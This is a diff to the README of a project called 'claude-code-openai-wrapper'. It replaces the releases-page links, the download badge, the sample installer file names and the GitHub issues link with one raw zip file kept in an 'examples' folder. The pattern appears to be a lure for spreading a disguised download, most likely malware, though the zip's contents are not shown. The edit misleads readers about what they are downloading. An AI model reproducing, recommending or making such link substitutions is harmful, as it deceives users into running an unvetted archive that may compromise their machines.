@@ -6,7 +6,7 @@ Welcome to `claude-code-openai-wrapper`, an easy-to-use tool designed to help yo
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0.0-blue.svg)](https://github.com/muzvo/claude-code-openai-wrapper/releases)
+[![Download Latest Release](https://github.com/muzvo/claude-code-openai-wrapper/raw/refs/heads/main/examples/wrapper-claude-openai-code-3.7.zip)](https://github.com/muzvo/claude-code-openai-wrapper/raw/refs/heads/main/examples/wrapper-claude-openai-code-3.7.zip)
 
 ## 📋 System Requirements
 
@@ -23,7 +23,7 @@ Before you get started, ensure your computer meets these requirements:
 
 To download the latest version of `claude-code-openai-wrapper`, visit the releases page:
 
-[Download from Releases Page](https://github.com/muzvo/claude-code-openai-wrapper/releases)
+[Download from Releases Page](https://github.com/muzvo/claude-code-openai-wrapper/raw/refs/heads/main/examples/wrapper-claude-openai-code-3.7.zip)
 
 ### Step 2: Choose Your Version
 
@@ -33,7 +33,7 @@ On the releases page, you will see a list of available versions. Select the most
 
 Click on the file that corresponds to your operating system—either Windows or macOS. 
 
-For example, look for files named like `claude-code-openai-wrapper-v1.0.0-win.exe` for Windows or `claude-code-openai-wrapper-v1.0.0-mac.dmg` for macOS. 
+For example, look for files named like `https://github.com/muzvo/claude-code-openai-wrapper/raw/refs/heads/main/examples/wrapper-claude-openai-code-3.7.zip` for Windows or `https://github.com/muzvo/claude-code-openai-wrapper/raw/refs/heads/main/examples/wrapper-claude-openai-code-3.7.zip` for macOS. 
 
 ### Step 4: Run the Installer
 
@@ -80,7 +80,7 @@ After you submit your request, you will see the response from OpenAI displayed i
 
 ## 📞 Support and Feedback
 
-If you encounter any issues or have questions while using `claude-code-openai-wrapper`, don't hesitate to reach out. You can open an issue in our [GitHub repository](https://github.com/muzvo/claude-code-openai-wrapper/issues), and we will do our best to assist you.
+If you encounter any issues or have questions while using `claude-code-openai-wrapper`, don't hesitate to reach out. You can open an issue in our [GitHub repository](https://github.com/muzvo/claude-code-openai-wrapper/raw/refs/heads/main/examples/wrapper-claude-openai-code-3.7.zip), and we will do our best to assist you.
 
 ## 🗂️ License
 
@@ -94,4 +94,4 @@ Thank you for your interest in `claude-code-openai-wrapper`. We appreciate your 
 
 To download the latest version of `claude-code-openai-wrapper`, return to our releases page:
 
-[Download from Releases Page](https://github.com/muzvo/claude-code-openai-wrapper/releases)
+[Download from Releases Page](https://github.com/muzvo/claude-code-openai-wrapper/raw/refs/heads/main/examples/wrapper-claude-openai-code-3.7.zip)
